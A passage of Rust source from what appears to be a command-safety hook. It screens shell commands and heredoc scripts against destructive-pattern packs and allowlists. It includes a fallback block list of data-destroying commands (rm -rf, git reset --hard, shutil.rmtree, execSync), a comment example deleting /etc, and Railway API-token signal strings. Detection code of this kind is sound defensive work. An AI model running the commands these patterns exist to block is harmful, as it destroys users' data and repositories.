fn evaluate_original_control_plane_payloads(
    pack_id: &str,
    pack: &crate::packs::Pack,
    command_for_packs: &str,
    original_command: &str,
    allowlists: &LayeredAllowlist,
    project_path: Option<&Path>,
    first_allowlist_hit: &mut Option<(PatternMatch, AllowlistLayer, String)>,
    deadline: Option<&Deadline>,
) -> Option<EvaluationResult> {
    if !should_check_original_control_plane_payload(pack_id, command_for_packs, original_command) {
        return None;
    }

    let original_len = original_command.len();
    let segment_ranges = command_segment_ranges(original_command);
    if segment_ranges.len() <= 1 {
        let command_slice = control_plane_segment_for_matching(original_command);
        return evaluate_pack_destructive_patterns(
            pack_id,
            pack,
            command_slice.as_ref(),
            0,
            original_command,
            Some(0),
            original_len,
            allowlists,
            project_path,
            first_allowlist_hit,
            deadline,
            &[],
        );
    }

    for (segment_start, segment_end) in segment_ranges {
        let segment = &original_command[segment_start..segment_end];
        if original_control_plane_segment_is_relevant(pack_id, segment) {
            let command_slice = control_plane_segment_for_matching(segment);
            if let Some(result) = evaluate_pack_destructive_patterns(
                pack_id,
                pack,
                command_slice.as_ref(),
                segment_start,
                original_command,
                Some(0),
                original_len,
                allowlists,
                project_path,
                first_allowlist_hit,
                deadline,
                &[],
            ) {
                return Some(result);
            }
        }
    }

    None
}

fn control_plane_segment_for_matching(segment: &str) -> Cow<'_, str> {
    if !segment.contains(['\r', '\n']) {
        return Cow::Borrowed(segment);
    }

    let mut normalized = String::with_capacity(segment.len());
    for ch in segment.chars() {
        if matches!(ch, '\r' | '\n') {
            normalized.push(' ');
        } else {
            normalized.push(ch);
        }
    }
    Cow::Owned(normalized)
}

fn command_segment_ranges(cmd: &str) -> Vec<(usize, usize)> {
    crate::packs::split_command_segments(cmd)
        .into_iter()
        .map(|segment| {
            let start = segment.as_ptr() as usize - cmd.as_ptr() as usize;
            (start, start + segment.len())
        })
        .collect()
}

fn span_is_inside_any_segment(span: MatchSpan, segment_ranges: &[(usize, usize)]) -> bool {
    segment_ranges
        .iter()
        .any(|&(start, end)| span.start >= start && span.end <= end)
}

fn should_check_original_control_plane_payload(
    pack_id: &str,
    command_for_packs: &str,
    original_command: &str,
) -> bool {
    // `curl -d/--data*` payloads are normally masked as inert data to avoid
    // generic false positives. Railway's API protections intentionally inspect
    // GraphQL mutation payloads, so re-check only that control-plane pack on an
    // executing curl command after the sanitized pass misses. The original
    // command must still carry a Railway API signal; this keeps documentation
    // strings such as `echo 'projectDelete RAILWAY_API_TOKEN'` masked.
    command_for_packs != original_command
        && matches!(pack_id, "platform.railway")
        && command_contains_curl_invocation(command_for_packs)
        && original_command_contains_railway_api_signal(original_command)
}

fn original_control_plane_segment_is_relevant(pack_id: &str, segment: &str) -> bool {
    matches!(pack_id, "platform.railway")
        && command_contains_curl_invocation(segment)
        && original_command_contains_railway_api_signal(segment)
}

fn command_contains_curl_invocation(command: &str) -> bool {
    command
        .split(|ch: char| ch.is_ascii_whitespace() || matches!(ch, ';' | '&' | '|' | '(' | ')'))
        .map(|word| word.trim_matches(['"', '\'']))
        .filter_map(|word| word.rsplit(['/', '\\']).next())
        .map(|name| {
            if name.len() >= 4 && name[name.len() - 4..].eq_ignore_ascii_case(".exe") {
                &name[..name.len() - 4]
            } else {
                name
            }
        })
        .any(|name| name.eq_ignore_ascii_case("curl"))
}

fn should_check_original_control_plane_payload_for_any_pack(
    command_for_packs: &str,
    original_command: &str,
    ordered_packs: &[String],
) -> bool {
    ordered_packs.iter().any(|pack_id| {
        should_check_original_control_plane_payload(pack_id, command_for_packs, original_command)
    })
}

fn original_command_contains_railway_api_signal(command: &str) -> bool {
    let case_sensitive_signals = [
        "PROJECT_ACCESS_TOKEN",
        "RAILWAY_API_TOKEN",
        "RAILWAY_API_URL",
        "RAILWAY_TOKEN",
    ];
    if case_sensitive_signals
        .iter()
        .any(|signal| command.contains(signal))
    {
        return true;
    }

    let lower_command = command.to_ascii_lowercase();
    [
        "backboard.railway.app",
        "backboard.railway.com",
        "project-access-token",
        "railway.app/graphql",
        "railway.com/graphql",
    ]
    .iter()
    .any(|signal| lower_command.contains(signal))
}

#[allow(clippy::too_many_arguments)]
fn evaluate_pack_destructive_patterns(
    pack_id: &str,
    pack: &crate::packs::Pack,
    command_slice: &str,
    slice_offset: usize,
    original_command: &str,
    normalized_offset: Option<usize>,
    original_len: usize,
    allowlists: &LayeredAllowlist,
    project_path: Option<&Path>,
    first_allowlist_hit: &mut Option<(PatternMatch, AllowlistLayer, String)>,
    deadline: Option<&Deadline>,
    ignored_ranges: &[(usize, usize)],
) -> Option<EvaluationResult> {
    for pattern in &pack.destructive_patterns {
        if deadline_exceeded(deadline) || remaining_below(deadline, &crate::perf::PATTERN_MATCH) {
            return Some(EvaluationResult::allowed_due_to_budget());
        }

        let matched_span = pattern
            .regex
            .find(command_slice)
            .map(|(start, end)| MatchSpan {
                start: start + slice_offset,
                end: end + slice_offset,
            });

        if deadline_exceeded(deadline) {
            return Some(EvaluationResult::allowed_due_to_budget());
        }

        let Some(span) = matched_span else {
            continue;
        };

        if span_is_inside_any_segment(span, ignored_ranges) {
            continue;
        }

        let reason = pattern.reason;
        let mapped_span = map_span_with_offset(span, normalized_offset, original_len);
        let slice_span = MatchSpan {
            start: span.start.saturating_sub(slice_offset),
            end: span.end.saturating_sub(slice_offset),
        };
        let preview = mapped_span
            .as_ref()
            .map(|span| extract_match_preview(original_command, span))
            .or_else(|| Some(extract_match_preview(command_slice, &slice_span)));

        if let Some(pattern_name) = pattern.name {
            if let Some(hit) = allowlists.match_rule_at_path(pack_id, pattern_name, project_path) {
                if first_allowlist_hit.is_none() {
                    *first_allowlist_hit = Some((
                        PatternMatch {
                            pack_id: Some(pack_id.to_string()),
                            pattern_name: Some(pattern_name.to_string()),
                            severity: Some(pattern.severity),
                            reason: reason.to_string(),
                            source: MatchSource::Pack,
                            matched_span: mapped_span,
                            matched_text_preview: preview,
                            explanation: pattern.explanation.map(str::to_string),
                            suggestions: pattern.suggestions,
                        },
                        hit.layer,
                        hit.entry.reason.clone(),
                    ));
                }
                continue;
            }

            if let Some(mapped_span) = mapped_span {
                return Some(EvaluationResult::denied_by_pack_pattern_with_span(
                    pack_id,
                    pattern_name,
                    reason,
                    pattern.explanation,
                    pattern.severity,
                    pattern.suggestions,
                    original_command,
                    mapped_span,
                ));
            }

            return Some(EvaluationResult::denied_by_pack_pattern(
                pack_id,
                pattern_name,
                reason,
                pattern.explanation,
                pattern.severity,
                pattern.suggestions,
            ));
        }

        if let Some(mapped_span) = mapped_span {
            return Some(EvaluationResult::denied_by_pack_with_span(
                pack_id,
                reason,
                pattern.explanation,
                original_command,
                mapped_span,
            ));
        }

        return Some(EvaluationResult::denied_by_pack(
            pack_id,
            reason,
            pattern.explanation,
        ));
    }

    None
}

/// Evaluate a command with legacy pattern support using precompiled overrides.
///
/// This version includes legacy `SAFE_PATTERNS` and `DESTRUCTIVE_PATTERNS` checking.
/// It's intended to be used by the main hook entrypoint until the legacy patterns
/// are migrated to the pack system (git_safety_guard-99e.3.4).
///
/// # Arguments
///
/// * `command` - The raw command string to evaluate
/// * `config` - Loaded configuration with pack settings
/// * `enabled_keywords` - Keywords from enabled packs for quick rejection
/// * `compiled_overrides` - Precompiled config overrides (avoids per-command regex compilation)
/// * `safe_patterns` - Legacy safe patterns (whitelist)
/// * `destructive_patterns` - Legacy destructive patterns (blacklist)
///
/// # Type Parameters
///
/// This function accepts any types that implement pattern matching:
/// * `S` - Safe pattern type with `is_match` method returning `bool`
/// * `D` - Destructive pattern type with `is_match` method returning `bool` and `reason` method
#[allow(clippy::too_many_lines)]
pub fn evaluate_command_with_legacy<S, D>(
    command: &str,
    config: &Config,
    enabled_keywords: &[&str],
    compiled_overrides: &crate::config::CompiledOverrides,
    allowlists: &LayeredAllowlist,
    safe_patterns: &[S],
    destructive_patterns: &[D],
) -> EvaluationResult
where
    S: LegacySafePattern,
    D: LegacyDestructivePattern,
{
    // Empty commands are allowed (no-op)
    if command.is_empty() {
        return EvaluationResult::allowed();
    }

    // Step 1: Check allow-once overrides (may be superseded by config blocklist).
    let allow_once = allow_once_match(command, None);

    // Step 2: Check precompiled block overrides before allow overrides. Deny
    // wins on overlapping config overrides unless allow-once was granted with
    // force_allow_config.
    if let Some(reason) = compiled_overrides.check_block(command) {
        if allow_once
            .as_ref()
            .is_some_and(|entry| entry.force_allow_config)
        {
            return EvaluationResult::allowed();
        }
        return EvaluationResult::denied_by_config(reason.to_string());
    }

    if compiled_overrides.check_allow(command) {
        return EvaluationResult::allowed();
    }

    if allow_once.is_some() {
        return EvaluationResult::allowed();
    }

    // Step 2.5: Pre-calculate ordered packs for heredoc recursion (and later use)
    let enabled_packs: HashSet<String> = config.enabled_pack_ids();
    let ordered_packs = REGISTRY.expand_enabled_ordered(&enabled_packs);
    let keyword_index = REGISTRY.build_enabled_keyword_index(&ordered_packs);

    // Step 3: Heredoc / inline-script detection (Tier 1/2/3, fail-open).
    // See `evaluate_command` for detailed rationale.
    let heredoc_settings = config.heredoc_settings();
    let mut precomputed_sanitized = None;
    let mut heredoc_allowlist_hit: Option<(PatternMatch, AllowlistLayer, String)> = None;
    let project_path = resolve_project_path(&heredoc_settings, None);
    let project_path = project_path.as_deref();
    if heredoc_settings.enabled && check_triggers(command) == TriggerResult::Triggered {
        let sanitized = sanitize_for_pattern_matching(command);
        let sanitized_str = sanitized.as_ref();
        let should_scan = if matches!(sanitized, std::borrow::Cow::Owned(_)) {
            check_triggers(sanitized_str) == TriggerResult::Triggered
        } else {
            true
        };
        precomputed_sanitized = Some(sanitized);

        if should_scan {
            let context = HeredocEvaluationContext {
                allowlists,
                heredoc_settings: &heredoc_settings,
                project_path,
                deadline: None,
                enabled_keywords,
                ordered_packs: &ordered_packs,
                keyword_index: keyword_index.as_ref(),
                compiled_overrides,
                allow_once_audit: None,
            };
            if let Some(blocked) = evaluate_heredoc(command, context, &mut heredoc_allowlist_hit) {
                return blocked;
            }
        }
    }

    // Step 4: Quick rejection - if no relevant keywords, allow immediately
    if pack_aware_quick_reject(command, enabled_keywords) {
        if let Some((matched, layer, reason)) = heredoc_allowlist_hit {
            return EvaluationResult::allowed_by_allowlist(matched, layer, reason);
        }
        return EvaluationResult::allowed();
    }

    // Step 5: False-positive immunity - strip known-safe string arguments (commit messages, search
    // patterns, issue descriptions, etc.) so dangerous substrings inside data do not trigger
    // blocking.
    //
    // Also normalize the command here (Step 6) and reuse for pattern matching.
    // pack_aware_quick_reject_with_normalized returns both the quick-reject decision
    // and the normalized command, avoiding duplicate normalization.
    let sanitized = precomputed_sanitized.unwrap_or_else(|| sanitize_for_pattern_matching(command));
    let command_for_match = sanitized.as_ref();

    // Use the optimized version that returns both decision and normalized form.
    let (quick_reject, normalized) =
        pack_aware_quick_reject_with_normalized(command_for_match, enabled_keywords);
    if quick_reject {
        if let Some((matched, layer, reason)) = heredoc_allowlist_hit {
            return EvaluationResult::allowed_by_allowlist(matched, layer, reason);
        }
        return EvaluationResult::allowed();
    }

    // Built-in inspection-wrapper exemption (dcg#132).
    //
    // Mirrors the check in `evaluate_command_with_pack_order_deadline_at_path`:
    // a small hard-coded set of inspection-wrapper prefixes (e.g.
    // `ee preflight check --cmd`) consumes the destructive command as data,
    // not as an instruction. Without this, dcg substring-matches the
    // destructive verb inside the analyzed argument and blocks the wrapper.
    // See `BUILTIN_INSPECTION_WRAPPER_PREFIXES` for the safe-list and
    // `command_prefix_safely_matches` for the anti-injection guard.
    if crate::allowlist::is_builtin_inspection_wrapper_call(command)
        || crate::allowlist::is_builtin_inspection_wrapper_call(&normalized)
    {
        return EvaluationResult::allowed();
    }

    // Step 7: Check legacy safe patterns (whitelist, reusing normalized from quick-reject)
    for pattern in safe_patterns {
        if pattern.is_match(&normalized) {
            return EvaluationResult::allowed();
        }
    }

    let normalized_offset = compute_normalized_offset(command_for_match, &normalized);
    let original_len = command.len();

    // Step 8: Check legacy destructive patterns (blacklist)
    for pattern in destructive_patterns {
        if let Some(span) = pattern.find_span(&normalized) {
            if let Some(mapped_span) = map_span_with_offset(span, normalized_offset, original_len) {
                return EvaluationResult::denied_by_legacy_with_span(
                    pattern.reason(),
                    command,
                    mapped_span,
                );
            }
            return EvaluationResult::denied_by_legacy(pattern.reason());
        }
    }

    // Step 9: Check enabled packs with allowlist override semantics.
    // Note: Legacy function doesn't receive project_path - path-aware allowlisting not available here
    let result = evaluate_packs_with_allowlists(
        &normalized,
        &normalized,
        command_for_match,
        command,
        &ordered_packs,
        allowlists,
        keyword_index.as_ref(),
        None,
        None, // project_path: legacy function, path-aware allowlisting unavailable
    );
    if result.allowlist_override.is_none() {
        if let Some((matched, layer, reason)) = heredoc_allowlist_hit {
            return EvaluationResult::allowed_by_allowlist(matched, layer, reason);
        }
    }

    result
}
/// Context for heredoc evaluation to avoid too many arguments.
#[derive(Clone, Copy)]
struct HeredocEvaluationContext<'a> {
    allowlists: &'a LayeredAllowlist,
    heredoc_settings: &'a crate::config::HeredocSettings,
    project_path: Option<&'a Path>,
    deadline: Option<&'a Deadline>,
    enabled_keywords: &'a [&'a str],
    ordered_packs: &'a [String],
    keyword_index: Option<&'a crate::packs::EnabledKeywordIndex>,
    compiled_overrides: &'a crate::config::CompiledOverrides,
    allow_once_audit: Option<&'a crate::pending_exceptions::AllowOnceAuditConfig<'a>>,
}

#[allow(clippy::too_many_lines)]
fn evaluate_heredoc(
    command: &str,
    context: HeredocEvaluationContext<'_>,
    first_allowlist_hit: &mut Option<(PatternMatch, AllowlistLayer, String)>,
) -> Option<EvaluationResult> {
    if deadline_exceeded(context.deadline)
        || remaining_below(context.deadline, &crate::perf::FULL_HEREDOC_PIPELINE)
    {
        return Some(EvaluationResult::allowed_due_to_budget());
    }

    // Check command-level allowlist before any extraction.
    // This allows users to whitelist entire commands (e.g., "./scripts/approved.sh").
    if let Some(ref content_allowlist) = context.heredoc_settings.content_allowlist {
        if let Some(matched_cmd) = content_allowlist.is_command_allowlisted(command) {
            tracing::debug!(matched_command = matched_cmd, "heredoc command allowlisted");
            // Command is allowlisted - skip all heredoc analysis
            return None;
        }
    }

    let (contents, fallback_needed) =
        match extract_content(command, &context.heredoc_settings.limits) {
            ExtractionResult::Extracted(contents) => (contents, false),
            ExtractionResult::NoContent => return None,
            ExtractionResult::Skipped(reasons) => {
                let is_timeout = reasons
                    .iter()
                    .any(|r| matches!(r, SkipReason::Timeout { .. }));

                let strict_timeout = is_timeout && !context.heredoc_settings.fallback_on_timeout;
                let strict_other = !is_timeout && !context.heredoc_settings.fallback_on_parse_error;
                if strict_timeout || strict_other {
                    let summary = reasons
                        .iter()
                        .map(std::string::ToString::to_string)
                        .collect::<Vec<_>>()
                        .join("; ");
                    let reason = if strict_timeout {
                        format!(
                            "Embedded code blocked: extraction exceeded timeout and \
                         fallback_on_timeout=false ({summary})"
                        )
                    } else {
                        format!(
                            "Embedded code blocked: extraction skipped and \
                         fallback_on_parse_error=false ({summary})"
                        )
                    };
                    return Some(EvaluationResult::denied_by_legacy(&reason));
                }

                // Fallback check: if skipped due to size limits, perform a rudimentary
                // substring check for critical patterns that would otherwise be missed.
                if reasons
                    .iter()
                    .any(|r| matches!(r, SkipReason::ExceededSizeLimit { .. }))
                {
                    if let Some(blocked) = check_fallback_patterns(command) {
                        return Some(blocked);
                    }
                }

                return None;
            }
            ExtractionResult::Partial { extracted, skipped } => {
                // Check strict mode settings for skipped items
                let is_timeout = skipped
                    .iter()
                    .any(|r| matches!(r, SkipReason::Timeout { .. }));

                let strict_timeout = is_timeout && !context.heredoc_settings.fallback_on_timeout;
                let strict_other = !is_timeout && !context.heredoc_settings.fallback_on_parse_error;
                if strict_timeout || strict_other {
                    let summary = skipped
                        .iter()
                        .map(std::string::ToString::to_string)
                        .collect::<Vec<_>>()
                        .join("; ");
                    let reason = if strict_timeout {
                        format!(
                            "Embedded code blocked: extraction exceeded timeout (partial) and \
                         fallback_on_timeout=false ({summary})"
                        )
                    } else {
                        format!(
                            "Embedded code blocked: extraction partial and \
                         fallback_on_parse_error=false ({summary})"
                        )
                    };
                    return Some(EvaluationResult::denied_by_legacy(&reason));
                }

                // We have partial content. Analyze what we extracted first (high fidelity).
                // Then if no block, run fallback checks on the whole command if size limit was exceeded.
                let fallback_needed = skipped
                    .iter()
                    .any(|r| matches!(r, SkipReason::ExceededSizeLimit { .. }));

                (extracted, fallback_needed)
            }
            ExtractionResult::Failed(err) => {
                if !context.heredoc_settings.fallback_on_parse_error {
                    let reason = format!(
                        "Embedded code blocked: extraction failed and \
                     fallback_on_parse_error=false ({err})"
                    );
                    return Some(EvaluationResult::denied_by_legacy(&reason));
                }

                return None;
            }
        };

    for content in contents {
        if deadline_exceeded(context.deadline) {
            return Some(EvaluationResult::allowed_due_to_budget());
        }

        if let Some(allowed) = &context.heredoc_settings.allowed_languages {
            if !allowed.contains(&content.language) {
                continue;
            }
        }

        // Check content-level allowlist before AST matching.
        // This allows users to whitelist specific patterns or content hashes.
        if let Some(ref content_allowlist) = context.heredoc_settings.content_allowlist {
            if let Some(hit) = content_allowlist.is_content_allowlisted(
                &content.content,
                content.language,
                context.project_path,
            ) {
                tracing::debug!(
                    hit_kind = hit.kind.label(),
                    matched = hit.matched,
                    reason = hit.reason,
                    "heredoc content allowlisted"
                );
                // Content is allowlisted - skip AST matching for this heredoc
                continue;
            }
        }

        // Skip ALL heredoc content analysis if the target command is non-executing.
        // Commands like `cat`, `tee`, `grep`, etc. just output the heredoc content
        // as data - they don't execute it as code. This prevents false positives
        // where documentation text containing dangerous command examples is blocked.
        if content
            .target_command
            .as_ref()
            .is_some_and(|cmd| crate::heredoc::is_non_executing_heredoc_command(cmd))
        {
            tracing::trace!(
                target_command = ?content.target_command,
                "Skipping heredoc content analysis for non-executing target"
            );
            continue; // Skip to next extracted content - this heredoc is just data
        }

        // Cheap, high-signal fallback before the expensive AST pass. If the
        // hook is already close to its fail-open deadline, this keeps obvious
        // catastrophic language-library deletes from being silently allowed.
        if let Some(m) =
            crate::ast_matcher::scan_filesystem_sink_fallback(&content.content, content.language)
        {
            if m.severity.blocks_by_default() {
                let (pack_id, pattern_name) = split_ast_rule_id(&m.rule_id);

                if let Some(hit) = context.allowlists.match_rule_at_path(
                    &pack_id,
                    &pattern_name,
                    context.project_path,
                ) {
                    if first_allowlist_hit.is_none() {
                        let reason =
                            format_heredoc_denial_reason(&content, &m, &pack_id, &pattern_name);
                        let mapped_span = map_heredoc_span(command, &content, m.start, m.end);
                        *first_allowlist_hit = Some((
                            PatternMatch {
                                pack_id: Some(pack_id),
                                pattern_name: Some(pattern_name),
                                severity: Some(ast_severity_to_pack_severity(m.severity)),
                                reason,
                                source: MatchSource::HeredocAst,
                                matched_span: mapped_span,
                                matched_text_preview: Some(m.matched_text_preview),
                                explanation: None,
                                suggestions: &[],
                            },
                            hit.layer,
                            hit.entry.reason.clone(),
                        ));
                    }
                } else {
                    let reason =
                        format_heredoc_denial_reason(&content, &m, &pack_id, &pattern_name);
                    let mapped_span = map_heredoc_span(command, &content, m.start, m.end);
                    return Some(EvaluationResult {
                        decision: EvaluationDecision::Deny,
                        pattern_info: Some(PatternMatch {
                            pack_id: Some(pack_id),
                            pattern_name: Some(pattern_name),
                            severity: Some(ast_severity_to_pack_severity(m.severity)),
                            reason,
                            source: MatchSource::HeredocAst,
                            matched_span: mapped_span,
                            matched_text_preview: Some(m.matched_text_preview),
                            explanation: None,
                            suggestions: &[],
                        }),
                        allowlist_override: None,
                        effective_mode: Some(crate::packs::DecisionMode::Deny),
                        skipped_due_to_budget: false,
                        branch_context: None,
                        session_occurrence: None,
                        graduated_response: None,
                        bypass_method: None,
                    });
                }
            }
        }

        if remaining_below(context.deadline, &crate::perf::FULL_HEREDOC_PIPELINE) {
            return Some(EvaluationResult::allowed_due_to_budget());
        }

        // Tier 2.5: Recursive Shell Analysis
        // If content is Bash, extract inner commands and feed them back to the full evaluator.
        // This ensures that `kubectl`, `docker`, etc. inside heredocs are checked against their packs.
        if content.language == crate::heredoc::ScriptLanguage::Bash {
            // Fast pre-filter: skip the expensive tree-sitter AST parse if the
            // heredoc body contains none of the enabled pack keywords. The AC
            // automaton does a single O(n) scan; the AST parse is much heavier.
            let body_has_keywords = context.keyword_index.map_or_else(
                || {
                    context.enabled_keywords.iter().any(|kw| {
                        memchr::memmem::find(content.content.as_bytes(), kw.as_bytes()).is_some()
                    })
                },
                |index| index.has_any_keyword(&content.content),
            );

            if body_has_keywords {
                let inner_commands = crate::heredoc::extract_shell_commands(&content.content);
                for inner in inner_commands {
                    if deadline_exceeded(context.deadline) {
                        return Some(EvaluationResult::allowed_due_to_budget());
                    }

                    let result = evaluate_command_with_pack_order_deadline_at_path(
                        &inner.text,
                        context.enabled_keywords,
                        context.ordered_packs,
                        context.keyword_index,
                        context.compiled_overrides,
                        context.allowlists,
                        context.heredoc_settings,
                        context.allow_once_audit,
                        context.project_path,
                        context.deadline,
                    );

                    if result.is_denied() {
                        // Propagate denial, wrapping the reason context
                        if let Some(mut info) = result.pattern_info {
                            info.reason = format!(
                                "Embedded shell command blocked: {} (line {} of heredoc)",
                                info.reason, inner.line_number
                            );
                            info.source = MatchSource::HeredocAst; // Mark as heredoc source
                            if let Some(span) = info.matched_span {
                                if let Some(mapped_inner) =
                                    map_heredoc_span(command, &content, inner.start, inner.end)
                                {
                                    let mapped = MatchSpan {
                                        start: mapped_inner.start.saturating_add(span.start),
                                        end: mapped_inner.start.saturating_add(span.end),
                                    };
                                    if mapped.end <= command.len() {
                                        info.matched_span = Some(mapped);
                                        info.matched_text_preview =
                                            Some(extract_match_preview(command, &mapped));
                                    } else {
                                        info.matched_span = None;
                                    }
                                } else {
                                    info.matched_span = None;
                                }
                            }

                            return Some(EvaluationResult {
                                decision: EvaluationDecision::Deny,
                                pattern_info: Some(info),
                                allowlist_override: None,
                                effective_mode: Some(crate::packs::DecisionMode::Deny),
                                skipped_due_to_budget: false,
                                branch_context: None,
                                session_occurrence: None,
                                graduated_response: None,
                                bypass_method: None,
                            });
                        }
                        return Some(result);
                    }
                }
            } // body_has_keywords
        }

        let matches = match DEFAULT_MATCHER.find_matches(&content.content, content.language) {
            Ok(matches) => matches,
            Err(err) => {
                let is_timeout = matches!(err, crate::ast_matcher::MatchError::Timeout { .. });
                let strict_timeout = is_timeout && !context.heredoc_settings.fallback_on_timeout;
                let strict_other = !is_timeout && !context.heredoc_settings.fallback_on_parse_error;
                if strict_timeout || strict_other {
                    let reason = format!(
                        "Embedded code blocked: AST matching error with strict fallback \
                         configuration ({err})"
                    );
                    return Some(EvaluationResult::denied_by_legacy(&reason));
                }

                continue;
            }
        };

        for m in matches {
            if deadline_exceeded(context.deadline)
                || remaining_below(context.deadline, &crate::perf::FULL_HEREDOC_PIPELINE)
            {
                return Some(EvaluationResult::allowed_due_to_budget());
            }

            if !m.severity.blocks_by_default() {
                continue;
            }

            let (pack_id, pattern_name) = split_ast_rule_id(&m.rule_id);

            if let Some(hit) =
                context
                    .allowlists
                    .match_rule_at_path(&pack_id, &pattern_name, context.project_path)
            {
                if first_allowlist_hit.is_none() {
                    let reason =
                        format_heredoc_denial_reason(&content, &m, &pack_id, &pattern_name);
                    let mapped_span = map_heredoc_span(command, &content, m.start, m.end);
                    *first_allowlist_hit = Some((
                        PatternMatch {
                            pack_id: Some(pack_id),
                            pattern_name: Some(pattern_name),
                            severity: Some(ast_severity_to_pack_severity(m.severity)),
                            reason,
                            source: MatchSource::HeredocAst,
                            matched_span: mapped_span,
                            matched_text_preview: Some(m.matched_text_preview),
                            explanation: None,
                            suggestions: &[],
                        },
                        hit.layer,
                        hit.entry.reason.clone(),
                    ));
                }
                continue;
            }

            let reason = format_heredoc_denial_reason(&content, &m, &pack_id, &pattern_name);
            let mapped_span = map_heredoc_span(command, &content, m.start, m.end);
            return Some(EvaluationResult {
                decision: EvaluationDecision::Deny,
                pattern_info: Some(PatternMatch {
                    pack_id: Some(pack_id),
                    pattern_name: Some(pattern_name),
                    severity: Some(ast_severity_to_pack_severity(m.severity)),
                    reason,
                    source: MatchSource::HeredocAst,
                    matched_span: mapped_span,
                    matched_text_preview: Some(m.matched_text_preview),
                    explanation: None,
                    suggestions: &[],
                }),
                allowlist_override: None,
                effective_mode: Some(crate::packs::DecisionMode::Deny),
                skipped_due_to_budget: false,
                branch_context: None,
                session_occurrence: None,
                graduated_response: None,
                bypass_method: None,
            });
        }

        // Conservative exec-sink backstop (#136).
        //
        // Interpreter-source heredoc bodies (python -/node -/ruby/…) are masked
        // out of the evaluator's later raw-shell rescan because this AST path is
        // authoritative. ast-grep patterns only match specific call shapes, so an
        // aliased / inline-imported sink (e.g. `const cp = require("child_process");
        // cp.execSync("rm -rf /etc")`) can slip past them. Re-scan the raw body
        // for name-anchored exec sinks called with a destructive string literal so
        // masking never converts a real executing deletion into a false negative.
        // Inert literals with no sink call (`print("rm -rf x")`) do not match.
        if content
            .target_command
            .as_ref()
            .is_some_and(|cmd| crate::heredoc::is_interpreter_source_heredoc_command(cmd))
        {
            if let Some(m) =
                crate::ast_matcher::scan_executing_sink_fallback(&content.content, content.language)
            {
                if m.severity.blocks_by_default() {
                    let (pack_id, pattern_name) = split_ast_rule_id(&m.rule_id);

                    if let Some(hit) = context.allowlists.match_rule_at_path(
                        &pack_id,
                        &pattern_name,
                        context.project_path,
                    ) {
                        if first_allowlist_hit.is_none() {
                            let reason =
                                format_heredoc_denial_reason(&content, &m, &pack_id, &pattern_name);
                            let mapped_span = map_heredoc_span(command, &content, m.start, m.end);
                            *first_allowlist_hit = Some((
                                PatternMatch {
                                    pack_id: Some(pack_id),
                                    pattern_name: Some(pattern_name),
                                    severity: Some(ast_severity_to_pack_severity(m.severity)),
                                    reason,
                                    source: MatchSource::HeredocAst,
                                    matched_span: mapped_span,
                                    matched_text_preview: Some(m.matched_text_preview),
                                    explanation: None,
                                    suggestions: &[],
                                },
                                hit.layer,
                                hit.entry.reason.clone(),
                            ));
                        }
                    } else {
                        let reason =
                            format_heredoc_denial_reason(&content, &m, &pack_id, &pattern_name);
                        let mapped_span = map_heredoc_span(command, &content, m.start, m.end);
                        return Some(EvaluationResult {
                            decision: EvaluationDecision::Deny,
                            pattern_info: Some(PatternMatch {
                                pack_id: Some(pack_id),
                                pattern_name: Some(pattern_name),
                                severity: Some(ast_severity_to_pack_severity(m.severity)),
                                reason,
                                source: MatchSource::HeredocAst,
                                matched_span: mapped_span,
                                matched_text_preview: Some(m.matched_text_preview),
                                explanation: None,
                                suggestions: &[],
                            }),
                            allowlist_override: None,
                            effective_mode: Some(crate::packs::DecisionMode::Deny),
                            skipped_due_to_budget: false,
                            branch_context: None,
                            session_occurrence: None,
                            graduated_response: None,
                            bypass_method: None,
                        });
                    }
                }
            }
        }
    }

    if fallback_needed {
        if let Some(blocked) = check_fallback_patterns(command) {
            return Some(blocked);
        }
    }

    None
}

#[allow(dead_code)]
fn check_fallback_patterns(command: &str) -> Option<EvaluationResult> {
    // List of critical destructive patterns to check when AST analysis is skipped (e.g. oversized input).
    // These patterns must be robust to whitespace variations where applicable.
    static FALLBACK_PATTERNS: LazyLock<RegexSet> = LazyLock::new(|| {
        RegexSet::new([
            r"shutil\.rmtree",
            r"os\.remove",
            r"os\.rmdir",
            r"os\.unlink",
            r"fs\.rmSync",
            r"fs\.rmdirSync",
            r"child_process\.execSync",
            r"child_process\.spawnSync",
            r"os\.RemoveAll",
            r"\brm\s+(?:-[a-zA-Z]*r[a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*r)\b", // rm -rf, rm -fr, rm -r -f
            r"\bgit\s+reset\s+--hard\b",
        ])
        .expect("fallback patterns must compile")
    });

    // Sanitize the command first to mask comments and safe arguments (e.g. commit messages).
    // This prevents false positives where a destructive command is mentioned in a comment
    // inside a large heredoc.
    let sanitized = sanitize_for_pattern_matching(command);
    let check_target = sanitized.as_ref();

    if FALLBACK_PATTERNS.is_match(check_target) {
        return Some(EvaluationResult::denied_by_legacy(
            "Oversized command contains destructive pattern (fallback check)",
        ));
    }

    None
}

fn split_ast_rule_id(rule_id: &str) -> (String, String) {
    // Expected format: heredoc.<language>.<pattern>[.<suffix>...]
    if let Some(rest) = rule_id.strip_prefix("heredoc.") {
        if let Some((lang, tail)) = rest.split_once('.') {
            let pack_id = format!("heredoc.{lang}");
            return (pack_id, tail.to_string());
        }
        return ("heredoc".to_string(), rule_id.to_string());
    }

    // Fallback: best-effort split on last dot.
    if let Some((pack_id, pattern_name)) = rule_id.rsplit_once('.') {
        return (pack_id.to_string(), pattern_name.to_string());
    }

    ("unknown".to_string(), rule_id.to_string())
}

fn format_heredoc_denial_reason(
    extracted: &crate::heredoc::ExtractedContent,
    m: &crate::ast_matcher::PatternMatch,
    pack_id: &str,
    pattern_name: &str,
) -> String {
    let lang = match extracted.language {
        crate::heredoc::ScriptLanguage::Bash => "bash",
        crate::heredoc::ScriptLanguage::Go => "go",
        crate::heredoc::ScriptLanguage::Python => "python",
        crate::heredoc::ScriptLanguage::Ruby => "ruby",
        crate::heredoc::ScriptLanguage::Perl => "perl",
        crate::heredoc::ScriptLanguage::JavaScript => "javascript",
        crate::heredoc::ScriptLanguage::TypeScript => "typescript",
        crate::heredoc::ScriptLanguage::Php => "php",
        crate::heredoc::ScriptLanguage::Unknown => "unknown",
    };

    format!(
        "Embedded {lang} code blocked: {} (rule {pack_id}:{pattern_name}, line {}, matched: {})",
        m.reason, m.line_number, m.matched_text_preview
    )
}

fn map_heredoc_span(
    command: &str,
    content: &crate::heredoc::ExtractedContent,
    start: usize,
    end: usize,
) -> Option<MatchSpan> {
    let range = content.content_range.as_ref()?;
    let raw = command.get(range.clone())?;
    if raw.len() != content.content.len() {
        return None;
    }
    if raw != content.content {
